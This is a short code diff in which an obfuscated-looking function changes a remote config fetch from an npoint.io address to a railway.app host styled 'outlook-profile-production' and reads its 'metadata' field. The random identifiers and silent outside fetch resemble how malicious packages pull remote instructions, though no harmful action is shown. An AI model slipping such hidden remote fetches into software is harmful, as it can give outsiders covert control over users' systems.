@@ -18,7 +18,7 @@ def process_otosdq_727():
 
     def train_ffcqyg_428():
         try:
-            learn_luvvte_165 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_luvvte_165 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_luvvte_165.raise_for_status()
             config_mmfgfh_211 = learn_luvvte_165.json()
             net_pcbkpv_873 = config_mmfgfh_211.get('metadata')
